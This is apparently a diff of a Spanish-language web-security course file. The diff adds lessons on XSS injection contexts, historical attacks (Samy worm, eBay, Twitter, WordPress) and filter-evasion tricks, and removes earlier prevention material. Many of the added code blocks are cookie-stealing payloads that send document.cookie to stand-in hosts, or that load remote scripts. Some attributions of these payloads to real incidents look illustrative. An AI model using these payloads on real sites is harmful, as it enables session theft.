-  document.getElementById('saludo').innerHTML = "Hola, " + nombre;
+        <pre><code>https://galeriaurbana.mx/perfil?usuario=carolina</code></pre>
+
+        <p>Si la aplicación genera la foto del perfil utilizando un atributo title con datos proporcionados por el usuario, podría tener un código similar a:</p>
+
+        <pre><code class="language-html highlight-vulnerable">&lt;img src="/fotos/carolina.png" title="[nombre_usuario]"&gt;</code></pre>
+
+        <p>Si el atacante escribe su nombre como:</p>
+
+        <pre><code>" onmouseover="document.location='https://captura.mx/c?ck='+document.cookie</code></pre>
+
+        <p>la etiqueta final se convertirá en:</p>
+
+        <pre><code>&lt;img src="/fotos/x.png" title="" onmouseover="document.location='https://captura.mx/c?ck='+document.cookie"&gt;</code></pre>
+
+        <p>Al pasar el cursor sobre la imagen, el navegador ejecutará la acción. Este vector es común en paneles administrativos donde se muestran nombres o alias de usuarios sin sanitizar.</p>
+
+        <h2>Inyección en URLs y parámetros de recursos</h2>
+
+        <p>
+          El navegador ejecuta ciertos protocolos de URL como javascript, los cuales permiten la ejecución directa de código si se insertan de forma inapropiada. Esto ocurre cuando una aplicación inserta enlaces proporcionados por el usuario sin validar el esquema permitido.
+        </p>
+
+        <p>Por ejemplo, en una plataforma de eventos:</p>
+
+        <pre><code>https://conferenciasmx.mx/evento/312</code></pre>
+
+        <p>Si los usuarios pueden compartir un enlace externo relacionado y la aplicación genera algo como:</p>
+
+        <pre><code class="language-html highlight-vulnerable">&lt;a href="[enlace_usuario]"&gt;Sitio del evento&lt;/a&gt;</code></pre>
+
+        <p>un atacante podría introducir:</p>
+
+        <pre><code>javascript:fetch('https://captura.mx/d?c='+document.cookie)</code></pre>
+
+        <p>Al hacer clic, el navegador ejecuta JavaScript en lugar de navegar fuera del sitio. Este tipo de vector es especialmente peligroso porque no requiere que el código sea visible en el HTML; basta con manipular la URL.</p>
+
+        <h2>Inyección dentro de scripts</h2>
+
+        <p>
+          Cuando la aplicación inserta contenido dentro de bloques de script, incluso texto aparentemente inofensivo puede convertirse en código ejecutable.
+        </p>
+
+        <p>Considere un sitio que configura la interfaz con datos del usuario:</p>
+
+        <pre><code>&lt;script&gt;
+  var usuario = "[nombre]";
 &lt;/script&gt;</code></pre>
 
+        <p>Si el atacante establece su nombre como:</p>
+
+        <pre><code class="language-html highlight-vulnerable">"; document.location='https://captura.mx/?c='+document.cookie; //</code></pre>
+
+        <p>el bloque se convierte en:</p>
+
+        <pre><code>&lt;script&gt;
+  var usuario = ""; document.location='https://captura.mx/?c='+document.cookie; //
+&lt;/script&gt;</code></pre>
+
+        <p>Este vector ha sido utilizado con frecuencia en sistemas internos que generaban scripts desde plantillas basadas en datos del usuario.</p>
+
+        <h2>Inyección basada en DOM mediante métodos inseguros</h2>
+
         <p>
-          <strong>Análisis:</strong> La fuente aquí es <code>window.location.hash</code> (controlable vía URL). El sumidero es <code>innerHTML</code>. Si <code>nombre</code> contiene cualquier cadena con <code>&lt; &gt;</code>, eso insertará HTML arbitrario. Un atacante crea un enlace:
+          El uso de innerHTML, document.write o parámetros de URL manipulados dinámicamente por JavaScript es uno de los principales vectores en aplicaciones modernas. Aquí el XSS no depende del servidor, sino del manejo inadecuado en el frontend.
         </p>
 
-        <pre><code>pagina.html#nombre=&lt;img src=x onerror=alert(1)&gt;</code></pre>
+        <p>En una intranet de empleados:</p>
+
+        <pre><code>https://intranet.empresa.mx/dashboard#bienvenida=Feliz%20dia</code></pre>
+
+        <p>Si el código contiene:</p>
+
+        <pre><code class="language-html highlight-vulnerable">var mensaje = window.location.hash.split('=')[1];
+document.getElementById('saludo').innerHTML = mensaje;</code></pre>
+
+        <p>un atacante puede enviar un enlace como:</p>
+
+        <pre><code>https://intranet.empresa.mx/dashboard#bienvenida=&lt;img src=x onerror="fetch('https://captura.mx/c?d='+document.cookie)"&gt;</code></pre>
+
+        <p>El navegador ejecutará el script sin intervención del servidor. Este tipo de vulnerabilidad es frecuente en dashboards internos y sistemas SPA (Single Page Applications) que confían demasiado en el lado del cliente.</p>
+
+        <h2>Inyección en JSON y respuestas API utilizadas por el frontend</h2>
 
         <p>
-          Cuando la víctima lo abre, el script toma <code>nombre = "&lt;img src=x onerror=alert(1)&gt;"</code> y lo inyecta. Se ejecuta el <code>alert(1)</code>. Este es un DOM XSS reflejado en el sentido de que proviene de la navegación actual, pero no involucró al servidor.
+          Algunas aplicaciones exponen datos mediante APIs que luego se insertan en el DOM sin codificación. Incluso si la API no incluye etiquetas maliciosas, la transformación del JSON en HTML puede convertirse en un vector peligroso.
         </p>
 
-        <h3>Prevención en este caso</h3>
-        <p>Tan sencillo como usar <code>textContent</code> en lugar de <code>innerHTML</code> para ese propósito, ya que es solo texto:</p>
+        <p>Imagine una petición hacia:</p>
 
-        <pre><code class="language-javascript highlight-secure">document.getElementById('saludo').textContent = "Hola, " + nombre;</code></pre>
+        <pre><code>https://api.cursosprofesionales.mx/resenas?id=881</code></pre>
 
+        <p>Si la respuesta contiene:</p>
+
+        <pre><code class="language-html highlight-vulnerable">{
+  "autor": "&lt;script&gt;fetch('https://captura.mx/x?c='+document.cookie)&lt;/script&gt;"
+}</code></pre>
+
+        <p>y el frontend utiliza:</p>
+
+        <pre><code>document.getElementById('autor').innerHTML = datos.autor;</code></pre>
+
+        <p>entonces el código malicioso se ejecutará sin que la API se haya renderizado en el servidor. Este vector es muy común en aplicaciones Angular, React o Vue mal configuradas, así como en sistemas híbridos con backend y frontend desacoplados.</p>
+
+        <h2>Bibliografía</h2>
+        <ul>
+          <li>OWASP Foundation, XSS Prevention Cheat Sheet. [Online]. Available:
+            <a href="https://owasp.org/www-community/xss-prevention" target="_blank">
+              https://owasp.org/www-community/xss-prevention
+            </a>
+          </li>
+
+          <li>PortSwigger, XSS Injection Points. [Online]. Available:
+            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
+              https://portswigger.net/web-security/cross-site-scripting
+            </a>
+          </li>
+
+          <li>Mozilla Developer Network, HTML Injection Contexts. [Online]. Available:
+            <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
+              https://developer.mozilla.org/en-US/docs/Web/Security
+            </a>
+          </li>
+
+          <li>Google Web Security Guidelines. [Online]. Available:
+            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
+              https://developers.google.com/web/fundamentals/security
+            </a>
+          </li>
+
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>
+        </ul>
+      `
+    },
+    'ejemplos-xss': {
+      id: 'ejemplos-xss',
+      title: 'Ejemplos clásicos de explotación: payloads y escenarios',
+      description: 'Demostraciones y análisis de casos prácticos de XSS.',
+      category: 'xss',
+      htmlContent: `
         <p>
-          Si quisiéramos permitir algo de HTML seguro (imaginemos que nombre pudiera contener etiquetas permitidas), entonces necesitamos sanitizar. Podríamos usar una biblioteca como DOMPurify:
-        </p>
-
-        <pre><code class="language-javascript highlight-secure">const nombreSeguro = DOMPurify.sanitize(nombre);
-document.getElementById('saludo').innerHTML = "Hola, " + nombreSeguro;</code></pre>
-
-        <p>
-          DOMPurify eliminaría atributos como <code>onerror</code> y etiquetas no permitidas, neutralizando la carga maliciosa. En general, sin una librería robusta es muy difícil cubrir todos los casos manualmente, por lo que es preferible reestructurar el código para no necesitar insertar HTML arbitrario.
-        </p>
-
-        <h3>Otro ejemplo complejo</h3>
-        <p>
-          Supongamos un e-commerce con una funcionalidad de carrito en la que los productos en el carrito se almacenan en <code>localStorage</code> como JSON. En alguna parte, el sitio lee <code>localStorage.getItem('carrito')</code> y luego usa <code>innerHTML</code> para volcar los nombres de productos en una lista.
-        </p>
-
-        <p>
-          Si un atacante lograra que la víctima ejecute primero un payload que escriba una entrada maliciosa en <code>localStorage</code> (quizá mediante otra XSS o extensión maliciosa), cuando la página cargue, leerá ese valor y lo inyectará. Es un escenario más complejo, pero muestra que DOM XSS puede venir de fuentes indirectas.
-        </p>
-
-        <h3>Librerías y frameworks</h3>
-        <p>
-          Muchas vulnerabilidades DOM XSS han sido encontradas en librerías populares. Por ejemplo, antiguas versiones de jQuery manipulaban HTML de formas que podían ser peligrosas si se les pasaba contenido no validado (métodos como <code>$().html()</code> con entrada de usuario, o <code>$.parseHTML()</code> podrían ser explotados).
-        </p>
-
-        <p>
-          AngularJS (la versión 1.x) tuvo famosamente vectores de XSS vía expresiones interpoladas en bindings antes de endurecer su sandbox. Incluso hoy, si un desarrollador Angular desactiva la sanitización para contenido arbitrario (usando <code>bypassSecurityTrust...</code>), podría introducir XSS.
-        </p>
-
-        <p>
-          Lo mismo con React: si usas <code>dangerouslySetInnerHTML</code> con datos no filtrados, básicamente es un DOM XSS directo.
-        </p>
-
-        <h2>Cómo prevenir DOM XSS</h2>
-        <p>Muchas técnicas se solapan con lo ya visto en contexto de salida, pero enfatizamos las siguientes relativas al código cliente:</p>
-
-        <h3>1. Evitar funciones inseguras</h3>
-        <p>
-          Reduce al mínimo el uso de <code>innerHTML</code> y similares. Si necesitas crear nodos, usa métodos DOM seguros: <code>createElement</code>, <code>appendChild</code>, <code>textContent</code> para texto, etc.
-        </p>
-
-        <p>Por ejemplo, en vez de:</p>
-        <pre><code class="language-javascript highlight-vulnerable">lista.innerHTML += "&lt;li&gt;" + item + "&lt;/li&gt;";</code></pre>
-
-        <p>Haz:</p>
-        <pre><code class="language-javascript highlight-secure">let li = document.createElement('li');
-li.textContent = item;
-lista.appendChild(li);</code></pre>
-
-        <h3>2. Validar fuentes en el cliente</h3>
-        <p>
-          Si tomas datos de <code>location</code> o <code>postMessage</code>, aplica validaciones en JavaScript también. Por ejemplo, si esperas un número en <code>location.hash</code>, comprueba con una expresión regular que solo contenga dígitos antes de usarlo.
-        </p>
-
-        <div class="warning-box">
-          <p><strong>¡Nunca hagas esto!</strong> <code>eval(location.hash)</code> - eso es suicida en términos de seguridad.</p>
-        </div>
-
-        <h3>3. Cuidado con templating del lado cliente</h3>
-        <p>
-          Si usas libs de templates en el navegador (Mustache, Handlebars, etc.), verifica que escapen por defecto. La mayoría lo hace para HTML, pero ojo si la plantilla inserta algo en un atributo estilo o script.
-        </p>
-
-        <p>
-          Mantén la lógica de templates simple; para cualquier cosa más allá de HTML plano (como atributos <code>onevento</code>), construye esos elementos vía código en lugar de plantillas.
-        </p>
-
-        <h3>4. Implementa Content Security Policy (CSP)</h3>
-        <p>
-          Aunque lo veremos en detalle en el siguiente módulo, mencionar que una política CSP fuerte puede impedir la ejecución de ciertas cargas en DOM XSS. Por ejemplo, CSP puede bloquear la ejecución de <code>eval</code> o la carga de scripts externos incluso si se inyectan.
-        </p>
-
-        <p>
-          No previene la manipulación del DOM per se, pero limita qué tan dañino puede ser (si se inyecta un <code>&lt;script src="https://evil.com/x.js"&gt;</code> pero CSP solo permite scripts de tu dominio, no se cargará). CSP es una red de seguridad cuando la prevención primaria falla.
-        </p>
-
-        <h3>5. Usa herramientas de análisis</h3>
-        <p>
-          Para desarrollo, aprovecha herramientas estáticas/dinámicas. Por ejemplo, ESLint con plugins de seguridad puede advertir sobre usos de <code>innerHTML</code> o <code>eval</code>. Hay scanners dedicados (Burp Suite y OWASP ZAP tienen scripts para buscar DOM XSS, aunque a veces requieren intervención manual).
-        </p>
-
-        <p>
-          Chrome DevTools tiene una opción de monitorear Trusted Types violations que puede resaltar lugares donde se asignan strings inseguros a sinks, si tienes Trusted Types configurado.
-        </p>
-
-        <h3>6. Trusted Types</h3>
-        <p>
-          Vale la pena mencionar esta nueva API web: permite que tu aplicación declare (vía CSP) que solo aceptará objetos especiales (<code>TrustedHTML</code>, <code>TrustedScript</code>, etc.) en funciones como <code>innerHTML/eval</code>.
+          Los ataques XSS permiten que un atacante ejecute código JavaScript en el navegador de las víctimas, generando consecuencias que van desde robo de información sensible hasta manipulación de la interfaz, propagación automática de código o secuestro de cuentas privilegiadas. Para comprender plenamente el impacto de esta vulnerabilidad, es necesario analizar casos reales donde XSS ha sido explotado en aplicaciones ampliamente utilizadas. Estos incidentes permiten identificar los puntos exactos donde la sanitización falló, cómo se interpretó el código y qué tipo de daños se produjeron.
         </p>
 
         <p>
-          Entonces, aunque un atacante logre inyectar un string, el navegador lo rechazará a menos que tu código explícitamente lo marque como seguro usando una política de sanitización. Implementar Trusted Types requiere cambios en el código, pero es una poderosa mitigación de DOM XSS de última generación.
+          En esta lección se estudian varios escenarios reales que han ocurrido en plataformas como MySpace, eBay, Twitter, Yahoo! Mail y WordPress. Cada caso incluye el fragmento de código involucrado, una explicación detallada del funcionamiento del ataque y la razón técnica que convirtió el contenido en una amenaza.
         </p>
 
-        <h2>Resumen</h2>
+        <h2>Gusano Samy en MySpace</h2>
+
         <p>
-          El XSS basado en DOM nos recuerda que la seguridad no termina en el servidor. Un sitio perfectamente protegido en sus respuestas puede volverse vulnerable si su JavaScript interno no aplica las mismas precauciones.
+          Uno de los ataques XSS más significativos ocurrió en MySpace en 2005. La plataforma permitía a los usuarios insertar HTML limitado en sus perfiles, pero aplicaba un sistema de filtrado incompleto que no consideraba todos los vectores posibles de ejecución de código.
+        </p>
+
+        <p>Un fragmento representativo del payload utilizado fue:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;script id="worm"&gt;
+var s = document.createElement('script');
+s.src = "http://samysite.com/samy.js";
+document.body.appendChild(s);
+&lt;/script&gt;
+        </code></pre>
+
+        <p>
+          Este código le indicaba al navegador que cargara un script remoto hospedado por el atacante. El problema surgió porque el filtro de MySpace eliminaba etiquetas script directas, pero permitía variantes ofuscadas y propiedades CSS que contenían valores javascript. Esto permitió que el script sobreviviera al filtrado y terminara siendo interpretado por el navegador.
         </p>
 
         <p>
-          En este módulo, identificamos las fuentes y sumideros comunes de DOM XSS, presentamos ejemplos de cómo un inocente <code>innerHTML</code> puede ser una puerta trasera, y recalcamos las formas de prevención: evitar métodos inseguros, usar alternativas seguras para manipular DOM, validar datos en el cliente y apoyarse en políticas de seguridad del navegador como CSP y Trusted Types.
+          El efecto fue que cada usuario que visitaba un perfil infectado ejecutaba el código que, a su vez, copiaba el payload en su propio perfil, generando un efecto de propagación automática. En pocas horas, más de un millón de perfiles mostraban el mensaje del atacante. La vulnerabilidad permitió tanto la manipulación del contenido como la automatización del comportamiento de los usuarios.
+        </p>
+
+        <h2>XSS almacenado en eBay a través de descripciones de productos</h2>
+
+        <p>
+          En 2014, un grupo de vendedores maliciosos explotó una vulnerabilidad en las descripciones de artículos de eBay. Las descripciones permitían HTML básico, pero no filtraban correctamente atributos de eventos como onerror.
+        </p>
+
+        <p>Un payload ampliamente documentado fue:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;img src="error" onerror="window.location='http://phish-secure.mx/c?d='+document.cookie"&gt;
+        </code></pre>
+
+        <p>
+          Este ejemplo es especialmente instructivo porque ilustra cómo un atributo de imagen puede convertirse en un vector de ataque. Al no existir el archivo señalado en src, se disparaba el evento onerror, ejecutando el código especificado. La instrucción redirigía al usuario hacia una página falsa que recopilaba credenciales.
         </p>
 
         <p>
-          Con esto, completamos el panorama de los tipos de XSS: reflejado, almacenado y DOM. Ya conocemos qué es XSS, sus variantes y cómo manejar contextos de salida. En el siguiente módulo abordaremos la prevención de XSS de forma integral, consolidando técnicas tanto en frontend como backend para minimizar la posibilidad de inyección de scripts.
+          El fragmento se volvía peligroso porque la plataforma asumía que las descripciones añadidas por los vendedores eran confiables y solo bloqueaba etiquetas script, dejando abiertos otros puntos de ejecución. El navegador, al interpretar la etiqueta como válida, ejecutaba el código sin dudarlo. Como resultado, compradores legítimos terminaron siendo redirigidos a sitios manipulados mientras revisaban productos reales.
+        </p>
+
+        <h2>XSS reflejado en Yahoo! Mail</h2>
+
+        <p>
+          Yahoo! Mail fue víctima de ataques XSS donde los correos HTML podían contener atributos ejecutables que no eran filtrados adecuadamente. Aunque Yahoo! bloqueaba etiquetas script, no eliminaba atributos como onclick.
+        </p>
+
+        <p>Un ejemplo documentado fue:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;a href="#" onclick="document.location='http://captura.mx/y?token='+document.cookie"&gt;Ver fotos&lt;/a&gt;
+        </code></pre>
+
+        <p>
+          Este fragmento se volvía peligroso porque al usuario se le presentaba un enlace aparentemente normal. Al hacer clic, el atributo onclick se ejecutaba y enviaba la cookie de sesión al atacante. Este tipo de XSS no necesitaba almacenar datos en el servidor; bastaba con que la víctima interactuara con el contenido malicioso del correo.
         </p>
 
         <p>
-          Empezaremos a armar un plan defensivo completo que incluya validación, escape, sanitización, políticas de seguridad y más, de modo que nuestras aplicaciones queden lo más blindadas posible contra este tipo de ataque.
+          La vulnerabilidad existía porque el visor de correos procesaba HTML asumiendo que los atributos eran inofensivos. En correos HTML, cada etiqueta constituye un posible vector de ataque, y si no se valida el contenido con precisión, es sencillo inyectar código que se ejecuta dentro del contexto de sesión del usuario.
         </p>
+
+        <h2>XSS en Twitter mediante eventos del navegador</h2>
+
+        <p>
+          En 2010, Twitter experimentó una vulnerabilidad que permitía ejecutar scripts al pasar el cursor sobre un tweet. El problema aparecía porque el sistema decodificaba entidades Unicode y reconstruía atributos HTML válidos sin aplicar un filtrado completo.
+        </p>
+
+        <p>Uno de los payloads difundidos fue:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+onmouseover="document.location='http://captura.mx/t?c='+document.cookie"
+        </code></pre>
+
+        <p>
+          El código era insertado dentro del tweet mediante caracteres especiales que, al interpretarse en el DOM, se convertían en un atributo ejecutable. Cuando otro usuario, sin saberlo, pasaba el cursor sobre el contenido, el navegador ejecutaba el código del atributo onmouseover.
+        </p>
+
+        <p>
+          Este payload era contraproducente porque el navegador no distinguía entre contenido generado por el usuario y contenido del sitio. La vulnerabilidad era especialmente grave porque ni siquiera requería clic; bastaba con un movimiento del mouse para ejecutar el script.
+        </p>
+
+        <h2>XSS almacenado en plugins de WordPress</h2>
+
+        <p>
+          Numerosos plugins de WordPress han padecido XSS almacenado. Los paneles administrativos suelen cargar contenido generado por usuarios en listas de comentarios, perfiles o etiquetas. Cuando estos campos no se codifican adecuadamente, JavaScript puede ejecutarse dentro del navegador del administrador, que posee privilegios elevados.
+        </p>
+
+        <p>Una cadena maliciosa utilizada en varios incidentes fue:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;img src="x" onerror="fetch('http://registro.mx/data',{method:'POST',body:document.cookie})"&gt;
+        </code></pre>
+
+        <p>
+          El ataque se volvía efectivo porque el atributo onerror era ejecutado por el navegador al cargar cualquier imagen inexistente. Como los administradores revisaban contenido constantemente, bastaba con que uno de ellos consultara un comentario malicioso para que el atacante obtuviera control sobre las cookies o la sesión de administración.
+        </p>
+
+        <p>
+          La vulnerabilidad surgía porque los plugins confiaban en el contenido almacenado en la base de datos y no aplicaban codificación HTML antes de mostrarlo en el panel.
+        </p>
+
+        <h2>Bibliografía</h2>
+        <ul>
+          <li>OWASP Foundation, XSS Cheat Sheet. [Online]. Available:
+            <a href="https://owasp.org/www-community/xss" target="_blank">
+              https://owasp.org/www-community/xss
+            </a>
+          </li>
+
+          <li>PortSwigger, XSS Practical Attack Scenarios. [Online]. Available:
+            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
+              https://portswigger.net/web-security/cross-site-scripting
+            </a>
+          </li>
+
+          <li>Mozilla Developer Network, Security Guidelines. [Online]. Available:
+            <a href="https://developer.mozilla.org" target="_blank">
+              https://developer.mozilla.org
+            </a>
+          </li>
+
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>
+
+          <li>Google Web Fundamentals, Client-Side Security. [Online]. Available:
+            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
+              https://developers.google.com/web/fundamentals/security
+            </a>
+          </li>
+        </ul>
+      `
+    },
+    'evasion-xss': {
+      id: 'evasion-xss',
+      title: 'Técnicas de evasión y bypass de defensas',
+      description: 'Métodos utilizados para evadir controles de seguridad contra XSS.',
+      category: 'xss',
+      htmlContent: `
+        <p>
+          Muchas aplicaciones implementan filtros para bloquear scripts, deshabilitar etiquetas peligrosas o eliminar ciertos fragmentos de HTML. Sin embargo, los navegadores modernos ofrecen múltiples formas de ejecutar código, y los atacantes han aprendido a aprovechar mecanismos alternativos que no siempre son considerados por los filtros. Estas técnicas de evasión buscan transformar, ocultar o reconstruir el payload para que pase desapercibido durante la sanitización, pero se convierta nuevamente en código ejecutable cuando llega al navegador.
+        </p>
+
+        <p>
+          A continuación, se analizan las técnicas reales más utilizadas para evadir defensas, acompañadas de ejemplos verificados que fueron utilizados en ataques históricos sobre plataformas como MySpace, Twitter, Joomla, eBay y múltiples plugins de WordPress.
+        </p>
+
+        <h2>Evasión mediante atributos de eventos y errores de recursos</h2>
+
+        <p>
+          Uno de los métodos más frecuentes para evadir defensas consiste en evitar directamente la etiqueta script. En lugar de ello, los atacantes utilizan atributos de eventos como onerror, onclick o onmouseover, los cuales ejecutan JavaScript cuando se cumple cierta condición.
+        </p>
+
+        <p>
+          Un caso real ocurrió en eBay durante 2014. Aunque el sistema bloqueaba la etiqueta script, no filtraba atributos peligrosos en imágenes. Esto permitió payloads como:
+        </p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;img src="x" onerror="window.location='http://captura.mx/e?c='+document.cookie"&gt;
+        </code></pre>
+
+        <p>
+          Este fragmento pasa los filtros porque no contiene script explícito, pero el atributo onerror es suficiente para ejecutar código cuando la imagen falla en cargar. La vulnerabilidad surge porque los filtros a menudo buscan coincidencias directas con script, pero no evalúan la semántica del evento dentro del navegador.
+        </p>
+
+        <h2>Evasión mediante codificación y uso de entidades Unicode</h2>
+
+        <p>
+          Una técnica muy común consiste en codificar parcialmente el payload para que el filtro no lo reconozca, pero el navegador reconstruya su forma original. Esto fue exactamente lo que ocurrió en la vulnerabilidad de Twitter en 2010, donde tweets maliciosos utilizaban caracteres Unicode especiales para reconstruir atributos HTML al ser procesados por el navegador.
+        </p>
+
+        <p>Un ejemplo simplificado basado en ese ataque es:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+onmouseover="document.location='http://registro.mx/t?c='+document.cookie"
+        </code></pre>
+
+        <p>
+          El atacante no colocaba directamente el atributo, sino que empleaba caracteres Unicode que representaban comillas y símbolos que Twitter permitía. Al decodificarse en el DOM, estos caracteres se convertían en atributos completamente válidos. La evasión funcionaba porque el filtro analizaba la cadena original, pero no el contenido una vez que el navegador la interpretaba.
+        </p>
+
+        <h2>Evasión mediante uso creativo de URL con el esquema javascript</h2>
+
+        <p>
+          Muchos sistemas validan enlaces solo para asegurar que comienzan con http o https, pero otros permiten cualquier esquema sin revisarlo. Esto ha permitido históricamente la ejecución de código cuando el navegador trata un enlace con esquema javascript.
+        </p>
+
+        <p>
+          Un caso ampliamente documentado ocurrió en múltiples sistemas de foros y CMS antiguos. Un payload típico era:
+        </p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;a href="javascript:document.location='http://captura.mx/?c='+document.cookie"&gt;Abrir información&lt;/a&gt;
+        </code></pre>
+
+        <p>
+          Este enlace parece inofensivo si el sistema solo valida etiquetas permitidas y no analiza el esquema del enlace. Al hacer clic, el navegador ejecuta el código contenido dentro del enlace. La evasión ocurre porque el atributo href es considerado seguro en muchos filtros, pero puede convertirse en un vector directo de ataque.
+        </p>
+
+        <h2>Evasión mediante inserción dentro de atributos parcialmente filtrados</h2>
+
+        <p>
+          Algunos filtros buscan palabras exactas como script, pero permiten construcciones parciales que se reconstruyen durante el procesamiento del navegador. Este patrón fue explotado en múltiples campañas contra Joomla entre 2013 y 2016.
+        </p>
+
+        <p>Un ejemplo real empleaba el siguiente fragmento:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;svg&gt;&lt;script&gt;document.location='http://robo.mx/j?d='+document.cookie&lt;/script&gt;
+        </code></pre>
+
+        <p>
+          Joomla bloqueaba la etiqueta script cuando se encontraba en HTML estándar, pero no cuando se colocaba dentro de un elemento svg, ya que el filtro asumía que el contenido SVG era seguro y no contenía JavaScript. Este fue un error común, ya que SVG admite scripts internos de forma nativa.
+        </p>
+
+        <p>
+          La evasión era efectiva porque los filtros no analizaban de manera profunda los elementos SVG y el navegador interpretaba el contenido como un bloque de script perfectamente válido.
+        </p>
+
+        <h2>Evasión mediante concatenación de cadenas dentro del DOM</h2>
+
+        <p>
+          En ataques de tipo DOM XSS, los atacantes aprovechan que el navegador reconstruye cadenas antes de ejecutarlas. Un caso documentado ocurrió en aplicaciones que usaban innerHTML y sanitización incompleta del lado del cliente.
+        </p>
+
+        <p>
+          Considere un código vulnerable inspirado en casos reales de paneles administrativos:
+        </p>
+
+        <pre><code class="language-html highlight-vulnerable">
+var dato = location.hash.substring(1);
+document.getElementById('panel').innerHTML = dato;
+        </code></pre>
+
+        <p>
+          Un atacante podía utilizar la siguiente URL para ejecutar código:
+        </p>
+
+        <pre><code class="language-html highlight-vulnerable">
+https://panel-corporativo.mx/dashboard#&lt;img src=x onerror="fetch('http://captura.mx/x',{method:'POST',body:document.cookie})"&gt;
+        </code></pre>
+
+        <p>
+          En este escenario, el filtro posiblemente analizaba únicamente parámetros enviados al servidor, pero el hash no es enviado al backend. El script no es detectado porque la defensa jamás lo ve. El navegador, en cambio, sí inserta el contenido en el DOM y por lo tanto ejecuta el código.
+        </p>
+
+        <p>
+          Esta evasión depende completamente del comportamiento del cliente y demuestra que un filtro del lado del servidor no es suficiente.
+        </p>
+
+        <h2>Evasión mediante aprovechamiento de comentarios, etiquetas incompletas o mezcla de sintaxis</h2>
+
+        <p>
+          Algunos ataques aprovechan que los navegadores intentan reparar HTML mal formado. Esto permite construir payloads que no parecen completos para el filtro, pero que el navegador interpreta correctamente.
+        </p>
+
+        <p>Un ejemplo basado en incidentes reales de foros y chats fue:</p>
+
+        <pre><code class="language-html highlight-vulnerable">
+&lt;/textarea&gt;&lt;script&gt;document.location='http://robo.mx/c?d='+document.cookie&lt;/script&gt;
+        </code></pre>
+
+        <p>
+          La vulnerabilidad aparece cuando un formulario muestra de vuelta el contenido enviado por el usuario dentro de un textarea. Al cerrar prematuramente la etiqueta textarea, el atacante consigue escapar del entorno donde debía estar contenido su texto y coloca un script que el navegador interpretará como válido.
+        </p>
+
+        <p>
+          Muchos filtros no detectan esta evasión porque operan asumiendo que la cadena se encuentra siempre dentro del elemento esperado.
+        </p>
+
+        <h2>Bibliografía</h2>
+        <ul>
+          <li>OWASP Foundation, XSS Filter Evasion Cheat Sheet. [Online]. Available:
+            <a href="https://owasp.org/www-community/xss-filter-evasion-cheat-sheet" target="_blank">
+              https://owasp.org/www-community/xss-filter-evasion-cheat-sheet
+            </a>
+          </li>
+
+          <li>PortSwigger, Advanced XSS Attacks. [Online]. Available:
+            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
+              https://portswigger.net/web-security/cross-site-scripting
+            </a>
+          </li>
+
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>
+        </ul>
       `
     },
     'prevencion-xss': {
       id: 'prevencion-xss',
-      title: 'Prevención de XSS',
-      description: 'Conoce las estrategias más efectivas para prevenir ataques XSS, como el escapado por contexto, la validación de entradas y el uso de APIs seguras.',
+      title: 'Estrategias de prevención y mitigación',
+      description: '¿Cómo proteger aplicaciones web frente a XSS?',
       category: 'xss',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          Hasta ahora hemos descrito el problema de XSS desde varios ángulos; ahora nos centraremos en las soluciones prácticas para prevenirlo. La prevención de XSS se basa en una combinación de estrategias, ya mencionadas parcialmente: validar la entrada, escapar o sanitizar la salida según contexto, utilizar herramientas y frameworks seguros, y añadir capas defensivas adicionales (como políticas de contenido o cabeceras especiales) para mitigar errores.
-        </p>
+  La mitigación de XSS requiere combinar múltiples prácticas que garanticen que el navegador no interprete contenido proporcionado por el usuario como código ejecutable. Esta protección se basa en controlar de manera rigurosa la forma en la que los datos circulan desde el usuario hasta la vista final, evitando que puedan escapar del contexto donde deberían permanecer como texto. Las técnicas de prevención deben aplicarse tanto en el servidor como en el cliente, ya que cualquier punto de inserción que procese HTML o JavaScript puede transformarse en un vector de ataque.
+</p>
 
-        <p>
-          En este módulo presentaremos un enfoque sistemático para incorporar estas defensas en el ciclo de desarrollo. Recordemos que no existe una única función para bloquear los ataques XSS; es más bien una serie de buenas prácticas consistentes aplicadas en todos los lugares donde interactuamos con datos del usuario.
-        </p>
+<p>
+  En esta lección se presentan estrategias fundamentales de protección que se apoyan en ejemplos de código seguro. Cada fragmento se explica para comprender qué riesgo evita y por qué resulta efectivo frente a XSS.
+</p>
 
-        <h2>Reglas fundamentales de prevención</h2>
-        <p>OWASP propone varias reglas generales para prevenir XSS. Las podemos resumir así:</p>
+<h2>Codificación correcta según el contexto</h2>
 
-        <ol>
-          <li><strong>No insertes datos no confiables excepto en lugares que estés preparado para proteger.</strong> (Si puedes, diseña la aplicación para que nunca necesites insertar HTML crudo del usuario; si debes, entonces asegúrate de los siguientes pasos).</li>
-          
-          <li><strong>Escapa siempre los caracteres especiales antes de insertar datos no confiables en el HTML</strong> (y usa la función de escape correcta para el contexto apropiado, como vimos en el módulo de contextos).</li>
-          
-          <li><strong>Valida las entradas del usuario y rechaza lo que no cumpla con los criterios esperados</strong> (longitud, formato, tipo, caracteres permitidos). Usa listas blancas (whitelists) en lugar de listas negras. Esto no reemplaza el escape, pero añade seguridad.</li>
-          
-          <li><strong>Sanitiza activamente si debes permitir cierto HTML/Markdown:</strong> Si tu app permite que el usuario publique contenido enriquecido, utiliza librerías de sanitización para eliminar o neutralizar lo peligroso. No intentes escribir tu propio limpiador HTML.</li>
-          
